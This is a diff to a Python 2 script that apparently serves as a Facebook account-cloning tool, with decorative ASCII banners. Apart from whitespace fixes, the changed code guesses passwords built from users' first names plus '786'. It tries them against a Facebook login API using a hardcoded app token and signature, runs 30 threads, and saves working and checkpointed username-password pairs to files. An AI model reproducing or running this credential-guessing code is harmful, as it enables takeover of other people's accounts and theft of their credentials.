@@ -67,7 +67,7 @@ logo = """\033[1;91m‎~~~~~~▄▌▐▀▀▀▀▀▀▀▀▀▀▀▀▀▀
 \033[1;96m████ 60% *___*
 \033[1;91m█████ 80% *___*
 \033[1;93m██████ 100% *___*
-                
+
 \033[1;93m███▓▒░░._\033[1;97mHTSUsmanOfficial\033[1;93m_.░░▒▓███►
 \033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"""
 
@@ -131,7 +131,7 @@ def login():
 	os.system('clear')
 	try:
 		toket = open('login.txt','r')
-		menu() 
+		menu()
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
@@ -292,7 +292,7 @@ def pilih_super():
 	else:
 		print "\x1b[1;91mFill in correctly"
 		pilih_super()
-	
+
 	print "\033[1;93mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
 	jalan('\033[1;93mPlease Wait\033[1;93m...')
 	titik = ['.   ','..  ','... ']
@@ -302,8 +302,8 @@ def pilih_super():
 	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
 	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
 	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
-	
-			
+
+
 	def main(arg):
 		global cekpoint,oks
 		user = arg
@@ -416,26 +416,26 @@ def pilih_super():
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
 																	cekpoint.append(user+pass7)
-													                        
-																 else:
-							                                                                               pass8 = b['first_name'] + '786'
-											                                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-											                                               q = json.load(data)
-											                                               if 'access_token' in q:
-												                                               print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;92m✧\x1b[1;97m-' + pass8
-												                                               oks.append(user+pass8)
-											                                          else:
-												                                          if 'www.facebook.com' in q["error_msg"]:
-													                                           print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass8
-													                                           cek = open("out/checkpoint.txt", "a")
-													                                           cek.write(user+"|"+pass8+"\n")
-													                                           cek.close()
-													                                           cekpoint.append(user+pass8)
+																else:
+																    pass8 = b['first_name'] + '786'
+																    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																    q = json.load(data)
+																    if 'access_token' in q:
+																        print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
+																        oks.append(user+pass8)
+																    else:
+																        if 'www.facebook.com' in q["error_msg"]:
+																            print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
+																            cek = open("out/checkpoint.txt", "a")
+																            cek.write(user+"|"+pass8+"\n")
+																            cek.close()
+																            cekpoint.append(user+pass8)
+
 		except:
 
 			pass
 
-		
+
 
 	p = ThreadPool(30)
 
@@ -443,7 +443,7 @@ def pilih_super():
 
 	print 42*"\033[1;96m="
 
-	
+
 	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
 	print "  \033[1;91m«---------Developed By Muhammad Usman------------»" #Dev:Mk_tricks
 	print '\033[1;92mProcess Has Been Completed\033[1;92m....'
@@ -457,10 +457,10 @@ def pilih_super():
                   >  -  <
 .-------------.""`-------`"".-------------.
 : \033[1;92m     Hope You YOU ENJOY THIS COMMAND..    \033[1;93m :
-'-----------------------------------------' 
+'-----------------------------------------'
                 ___)( )(___
                (((__) (__)))"""
-	
+
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	menu()
 if __name__ == '__main__':
